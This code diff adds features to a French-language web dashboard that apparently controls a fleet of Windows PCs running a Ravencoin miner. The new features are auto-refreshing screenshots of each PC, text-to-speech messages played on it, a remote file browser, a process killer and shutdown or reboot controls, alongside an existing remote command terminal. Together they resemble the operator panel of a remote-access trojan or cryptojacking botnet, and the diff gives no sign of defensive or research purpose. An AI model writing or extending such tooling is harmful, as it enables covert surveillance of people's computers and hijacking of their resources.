@@ -369,6 +369,20 @@ async function openMachineDetail(hostname){
     +'<div class="modal-section"><div class="modal-section-title">Controles</div><div class="modal-controls">'
     +'<div class="power-row" style="margin-bottom:12px"><label style="font-size:.85rem;color:var(--text2);min-width:80px">Puissance</label><input type="range" min="10" max="100" step="5" value="'+cp+'" onchange="setPower(\''+h+'\',this.value,true)" oninput="document.getElementById(\'mpw-val\').textContent=this.value+\'%\'"><span id="mpw-val" style="font-size:1rem;font-weight:700;color:var(--green);min-width:50px;text-align:right">'+cp+'%</span></div>'
     +'<div class="modal-btns"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">Capture</button><button class="btn-stop" onclick="stopMiner(\''+h+'\')">Stop</button><button class="btn-restart" onclick="restartMiner(\''+h+'\')">Restart</button></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">📸 Screenshot Live</div><div class="modal-controls">'
+    +'<div class="modal-btns"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">📸 Capturer</button><button class="btn-restart" onclick="startAutoScreen(\''+h+'\')">🔄 Auto (10s)</button><button class="btn-stop" onclick="stopAutoScreen()">⏹ Stop</button></div>'
+    +'<div id="live-screen" style="margin-top:8px"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">🔊 Text-to-Speech</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px"><input type="text" id="tts-input" placeholder="Message a dire sur le PC..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem" onkeydown="if(event.key===\'Enter\')sendTTS(\''+h+'\')"><button onclick="sendTTS(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer">🔊 Parler</button></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">📁 Explorateur Fichiers</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="file-path" value="C:\\\\" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')browseFiles(\''+h+'\')"><button onclick="browseFiles(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer">📂 Ouvrir</button></div>'
+    +'<div id="file-list" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.8rem;color:var(--text);max-height:250px;overflow-y:auto;white-space:pre-wrap;display:none"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">⚡ Power Controls</div><div class="modal-controls">'
+    +'<div class="modal-btns"><button style="background:var(--gold);color:#000;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="powerAction(\''+h+'\',\'sleep\')">😴 Veille</button><button style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="powerAction(\''+h+'\',\'reboot\')">🔄 Redemarrer</button><button style="background:var(--red);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="powerAction(\''+h+'\',\'shutdown\')">🔴 Eteindre</button></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">📋 Gestionnaire Processus</div><div class="modal-controls">'
+    +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="listProcesses(\''+h+'\')" style="background:var(--green3);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📋 Lister</button></div>'
+    +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="kill-input" placeholder="PID ou nom (ex: 1234 ou notepad.exe)" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem"><button onclick="killProcess(\''+h+'\')" style="background:var(--red);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">💀 Kill</button></div>'
+    +'<div id="proc-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:300px;overflow-y:auto;white-space:pre;display:none"></div></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">Terminal CMD</div><div class="modal-controls">'
     +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="cmd-input" placeholder="ex: ipconfig, tasklist, dir..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')execCmd(\''+h+'\')"><button onclick="execCmd(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer;white-space:nowrap">Executer</button></div>'
     +'<div id="cmd-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.8rem;color:var(--green);max-height:300px;overflow-y:auto;white-space:pre-wrap;display:none"></div></div></div>'
@@ -572,6 +586,98 @@ async function execCmd(hostname){
       if(attempts>20){clearInterval(poll);output.textContent+='Timeout - pas de reponse';}
     },2000);
   }catch(e){output.textContent='Erreur: '+e.message}
+}
+
+// TTS
+function sendTTS(hostname){
+  const msg=document.getElementById('tts-input').value.trim();
+  if(!msg)return;
+  sendCommand(hostname,'command','tts:'+msg);
+  showToast('🔊 Message envoye: '+msg);
+  document.getElementById('tts-input').value='';
+}
+
+// POWER CONTROLS
+function powerAction(hostname,action){
+  const labels={shutdown:'ETEINDRE',reboot:'REDEMARRER',sleep:'METTRE EN VEILLE'};
+  if(!confirm('⚠️ '+labels[action]+' le PC '+hostname+' ?'))return;
+  sendCommand(hostname,'command',action);
+  showToast('⚡ '+labels[action]+' envoye a '+hostname);
+}
+
+// AUTO SCREENSHOT
+let autoScreenInterval=null;
+function startAutoScreen(hostname){
+  stopAutoScreen();
+  requestScreenshot(hostname);
+  autoScreenInterval=setInterval(()=>{
+    sendCommand(hostname,'command','screenshot');
+    setTimeout(async()=>{
+      try{
+        const r=await fetch(SB+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname)+'&select=screenshot_b64,screenshot_at',{headers:H});
+        const d=await r.json();
+        if(d.length&&d[0].screenshot_b64){
+          const el=document.getElementById('live-screen');
+          if(el)el.innerHTML='<img src="data:image/jpeg;base64,'+d[0].screenshot_b64+'" style="width:100%;border-radius:8px;border:1px solid var(--border)">';
+        }
+      }catch{}
+    },5000);
+  },10000);
+  showToast('🔄 Auto-screenshot active (10s)');
+}
+function stopAutoScreen(){if(autoScreenInterval){clearInterval(autoScreenInterval);autoScreenInterval=null;showToast('⏹ Auto-screenshot arrete');}}
+
+// FILE MANAGER
+async function browseFiles(hostname){
+  const path=document.getElementById('file-path').value.trim();
+  if(!path)return;
+  const output=document.getElementById('file-list');
+  output.style.display='block';
+  output.textContent='Chargement de '+path+'...';
+  await sendCommand(hostname,'command','ls:'+path);
+  let attempts=0;
+  const poll=setInterval(async()=>{
+    attempts++;
+    try{
+      const r=await fetch(SB+'/rest/v1/machine_logs?hostname=eq.'+encodeURIComponent(hostname)+'&level=eq.cmd_output&order=created_at.desc&limit=1',{headers:H});
+      const d=await r.json();
+      if(d.length&&d[0].message&&d[0].message.includes('ls:')){
+        clearInterval(poll);
+        output.textContent=d[0].message.replace(/^CMD:[^\n]*\n/,'');
+      }
+    }catch{}
+    if(attempts>15){clearInterval(poll);output.textContent+='Timeout';}
+  },2000);
+}
+
+// PROCESS MANAGER
+async function listProcesses(hostname){
+  const output=document.getElementById('proc-output');
+  output.style.display='block';
+  output.textContent='Chargement des processus...';
+  await sendCommand(hostname,'command','processes');
+  let attempts=0;
+  const poll=setInterval(async()=>{
+    attempts++;
+    try{
+      const r=await fetch(SB+'/rest/v1/machine_logs?hostname=eq.'+encodeURIComponent(hostname)+'&level=eq.cmd_output&order=created_at.desc&limit=1',{headers:H});
+      const d=await r.json();
+      if(d.length&&d[0].message&&d[0].message.includes('processes')){
+        clearInterval(poll);
+        output.textContent=d[0].message.replace(/^CMD:[^\n]*\n/,'');
+      }
+    }catch{}
+    if(attempts>15){clearInterval(poll);output.textContent+='Timeout';}
+  },2000);
+}
+
+function killProcess(hostname){
+  const target=document.getElementById('kill-input').value.trim();
+  if(!target)return;
+  if(!confirm('💀 Kill '+target+' sur '+hostname+' ?'))return;
+  sendCommand(hostname,'command','kill:'+target);
+  showToast('💀 Kill envoye: '+target);
+  setTimeout(()=>listProcesses(hostname),3000);
 }
 
 fetchRvnPrice();setInterval(fetchRvnPrice,300000);
